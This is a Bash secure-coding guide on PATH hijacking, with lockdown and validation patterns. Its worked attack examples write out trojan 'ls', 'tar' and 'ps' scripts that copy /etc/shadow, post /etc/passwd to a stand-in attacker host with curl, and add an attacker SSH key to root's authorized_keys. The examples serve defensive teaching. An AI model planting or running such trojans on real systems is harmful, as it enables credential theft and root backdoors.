## PATH Security

**Always secure the PATH variable to prevent command substitution attacks and trojan binary injection. An insecure PATH is one of the most common attack vectors in shell scripts.**

**Rationale:**

- **Command Hijacking**: Attacker-controlled directories in PATH allow malicious binaries to replace system commands
- **Current Directory Risk**: `.` or empty elements in PATH cause commands to execute from the current directory
- **Privilege Escalation**: Scripts running with elevated privileges can be tricked into executing attacker code
- **Search Order Matters**: Earlier directories in PATH are searched first, allowing priority-based attacks
- **Environment Inheritance**: PATH is inherited from the caller's environment, which may be malicious
- **Defense in Depth**: Securing PATH is a critical layer of defense even when other precautions are taken

**Lock down PATH at script start:**

\`\`\`bash
#!/bin/bash
set -euo pipefail

# ✓ Correct - set secure PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH

# Rest of script uses locked-down PATH
command=$(which ls)  # Searches only trusted directories
\`\`\`

**Alternative: Validate existing PATH:**

\`\`\`bash
#!/bin/bash
set -euo pipefail

# ✓ Correct - validate PATH contains no dangerous elements
[[ "$PATH" =~ \.  ]] && die 1 'PATH contains current directory'
[[ "$PATH" =~ ^:  ]] && die 1 'PATH starts with empty element'
[[ "$PATH" =~ ::  ]] && die 1 'PATH contains empty element'
[[ "$PATH" =~ :$  ]] && die 1 'PATH ends with empty element'

# Additional checks for suspicious paths
[[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp'
[[ "$PATH" =~ ^/home ]] && die 1 'PATH starts with user home directory'
\`\`\`

**Attack Example 1: Current Directory in PATH**

\`\`\`bash
# Vulnerable script (doesn't set PATH)
#!/bin/bash
# /usr/local/bin/backup.sh
set -euo pipefail

# Script intends to use system ls
ls -la /etc > /tmp/backup_list.txt
\`\`\`

**Attack:**
\`\`\`bash
# Attacker creates malicious 'ls' in /tmp
cat > /tmp/ls << 'EOF'
#!/bin/bash
# Steal sensitive data
cp /etc/shadow /tmp/stolen_shadow
chmod 644 /tmp/stolen_shadow
# Now execute real ls to appear normal
/bin/ls "$@"
EOF
chmod +x /tmp/ls

# Attacker sets PATH with /tmp first
export PATH=/tmp:$PATH

# When victim runs backup script from /tmp:
cd /tmp
/usr/local/bin/backup.sh

# Script executes /tmp/ls instead of /bin/ls
# Attacker's code runs with script's privileges
\`\`\`

**Attack Example 2: Empty PATH Element**

\`\`\`bash
# PATH with empty element (double colon)
PATH=/usr/local/bin::/usr/bin:/bin

# Empty element is interpreted as current directory
# Same risk as PATH=.:/usr/local/bin:/usr/bin:/bin
\`\`\`

**Attack:**
\`\`\`bash
# Attacker creates malicious command in accessible directory
cat > ~/tar << 'EOF'
#!/bin/bash
# Exfiltrate data
curl -X POST -d @/etc/passwd https://attacker.com/collect
# Execute real command
/bin/tar "$@"
EOF
chmod +x ~/tar

# Vulnerable script runs from ~
cd ~
# With :: in PATH, searches current directory (~/tar found!)
tar -czf backup.tar.gz data/
\`\`\`

**Attack Example 3: Writable Directory in PATH**

\`\`\`bash
# PATH includes /opt/local/bin which is world-writable (misconfigured)
PATH=/opt/local/bin:/usr/local/bin:/usr/bin:/bin
\`\`\`

**Attack:**
\`\`\`bash
# Attacker creates trojan in writable PATH directory
cat > /opt/local/bin/ps << 'EOF'
#!/bin/bash
# Backdoor: Add SSH key for root access
mkdir -p /root/.ssh
echo "ssh-rsa AAAA... attacker@evil" >> /root/.ssh/authorized_keys
# Execute real ps
/bin/ps "$@"
EOF
chmod +x /opt/local/bin/ps

# When ANY script runs 'ps', attacker gains root access
\`\`\`

**Secure PATH patterns:**

**Pattern 1: Complete lockdown (recommended for security-critical scripts):**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Lock down PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH

# Use commands with confidence
tar -czf /backup/data.tar.gz /var/data
systemctl restart nginx
\`\`\`

**Pattern 2: Full command paths (maximum security):**

\`\`\`bash
#!/bin/bash
set -euo pipefail

# Don't rely on PATH at all - use absolute paths
/bin/tar -czf /backup/data.tar.gz /var/data
/usr/bin/systemctl restart nginx
/usr/bin/apt-get update

# Especially critical for common commands that might be trojaned
/bin/rm -rf /tmp/workdir
/bin/cat /etc/passwd | /bin/grep root
\`\`\`

**Pattern 3: PATH validation with fallback:**

\`\`\`bash
#!/bin/bash
set -euo pipefail

validate_path() {
  # Check for dangerous PATH elements
  if [[ "$PATH" =~ \\.  ]] || \
     [[ "$PATH" =~ ^:  ]] || \
     [[ "$PATH" =~ ::  ]] || \
     [[ "$PATH" =~ :$  ]] || \
     [[ "$PATH" =~ /tmp ]]; then
    # PATH is suspicious, reset to safe default
    export PATH='/usr/local/bin:/usr/bin:/bin'
    readonly PATH
    warn 'Suspicious PATH detected, reset to safe default'
  fi
}

validate_path

# Rest of script
\`\`\`

**Pattern 4: Command verification:**

\`\`\`bash
#!/bin/bash
set -euo pipefail

# Verify critical commands are from expected locations
verify_command() {
  local cmd=$1
  local expected_path=$2
  local actual_path

  actual_path=$(command -v "$cmd")

  if [[ "$actual_path" != "$expected_path" ]]; then
    die 1 "Security: $cmd is $actual_path, expected $expected_path"
  fi
}

# Verify before using critical commands
verify_command tar /bin/tar
verify_command rm /bin/rm
verify_command systemctl /usr/bin/systemctl

# Now safe to use
tar -czf backup.tar.gz data/
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - trusting inherited PATH
#!/bin/bash
set -euo pipefail
# No PATH setting - inherits from environment
ls /etc  # Could execute trojan ls from anywhere in caller's PATH

# ✗ Wrong - PATH includes current directory
export PATH=.:$PATH
# Now any command can be hijacked from current directory

# ✗ Wrong - PATH includes /tmp
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin
# /tmp is world-writable, attacker can place trojans there

# ✗ Wrong - PATH includes user home directories
export PATH=/home/user/bin:$PATH
# Attacker may have write access to /home/user/bin

# ✗ Wrong - empty elements in PATH
export PATH=/usr/local/bin::/usr/bin:/bin  # :: is current directory
export PATH=:/usr/local/bin:/usr/bin:/bin  # Leading : is current directory
export PATH=/usr/local/bin:/usr/bin:/bin:  # Trailing : is current directory

# ✗ Wrong - setting PATH late in script
#!/bin/bash
set -euo pipefail
# Commands here use inherited PATH (dangerous!)
whoami
hostname
# Only now setting secure PATH (too late!)
export PATH='/usr/bin:/bin'

# ✓ Correct - set PATH at top of script
#!/bin/bash
set -euo pipefail
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH
# Now all commands use secure PATH
\`\`\`

**Edge case: Scripts that need custom paths:**

\`\`\`bash
#!/bin/bash
set -euo pipefail

# Start with secure base PATH
readonly BASE_PATH='/usr/local/bin:/usr/bin:/bin'

# Add application-specific paths
readonly APP_PATH='/opt/myapp/bin'

# Combine with secure base first
export PATH="$BASE_PATH:$APP_PATH"
readonly PATH

# Validate application path exists and is not world-writable
[[ -d "$APP_PATH" ]] || die 1 "Application path does not exist: $APP_PATH"
[[ -w "$APP_PATH" ]] && die 1 "Application path is writable: $APP_PATH"

# Use commands from combined PATH
myapp-command --option
\`\`\`

**Special consideration: Sudo and PATH:**

\`\`\`bash
# When using sudo, PATH is reset by default
# /etc/sudoers typically includes:
# Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# ✓ This is safe - sudo uses secure_path
sudo /usr/local/bin/backup.sh

# ✗ This preserves user's PATH (dangerous if env_keep includes PATH)
# Don't configure sudoers with: Defaults env_keep += "PATH"

# ✓ Correct - script sets its own PATH regardless
sudo /usr/local/bin/backup.sh
# Even if sudo preserves PATH, script overwrites it:
#   readonly PATH='/usr/local/bin:/usr/bin:/bin'
\`\`\`

**Checking PATH from within script:**

\`\`\`bash
# Debug: Show PATH being used
debug() {
  >&2 echo "DEBUG: Current PATH=$PATH"
  >&2 echo "DEBUG: which tar=$(command -v tar)"
  >&2 echo "DEBUG: which rm=$(command -v rm)"
}

((DEBUG)) && debug

# Verify PATH doesn't contain dangerous elements
check_path_security() {
  local -a issues=()

  [[ "$PATH" =~ \\.  ]] && issues+=('contains current directory (.)')
  [[ "$PATH" =~ ^:  ]] && issues+=('starts with empty element')
  [[ "$PATH" =~ ::  ]] && issues+=('contains empty element (::)')
  [[ "$PATH" =~ :$  ]] && issues+=('ends with empty element')
  [[ "$PATH" =~ /tmp ]] && issues+=('contains /tmp')

  if ((${#issues[@]} > 0)); then
    error 'PATH security issues detected:'
    local issue
    for issue in "${issues[@]}"; do
      error "  - $issue"
    done
    return 1
  fi

  info 'PATH security check passed'
  return 0
}

check_path_security || die 1 'PATH security validation failed'
\`\`\`

**System-wide PATH security:**

\`\`\`bash
# Check system default PATH in /etc/environment
cat /etc/environment
# Should be: PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Check for world-writable directories in system PATH
IFS=':' read -ra path_dirs <<< "$PATH"
for dir in "${path_dirs[@]}"; do
  if [[ -d "$dir" && -w "$dir" ]]; then
    warn "World-writable directory in PATH: $dir"
  fi
done

# Find world-writable directories in PATH
find $(echo "$PATH" | tr ':' ' ') -maxdepth 0 -type d -writable 2>/dev/null
\`\`\`

**Real-world example: Distribution installer script:**

\`\`\`bash
#!/bin/bash
# Secure installer script for system-wide deployment
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Lock down PATH immediately - critical for security
readonly PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH

VERSION='1.0.0'
SCRIPT_NAME=$(basename "$0")

# Script metadata
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Verify we're using expected command locations
command -v tar | grep -q '^/bin/tar$' || \
  die 1 'Security: tar command not from /bin/tar'

# Rest of secure installation logic
\`\`\`

**Summary:**

- **Always set PATH** explicitly at the start of security-critical scripts
- **Use `readonly PATH`** to prevent later modification
- **Never include** `.` (current directory), empty elements, `/tmp`, or user directories
- **Validate PATH** if you must use inherited environment
- **Use absolute paths** for critical commands as defense in depth
- **Place PATH setting early** - first few lines after `set -euo pipefail`
- **Check permissions** on directories in PATH (none should be world-writable)
- **Test PATH security** as part of your script testing process

**Key principle:** PATH is trusted implicitly by command execution. An attacker who controls your PATH controls which code runs. Always secure it first.
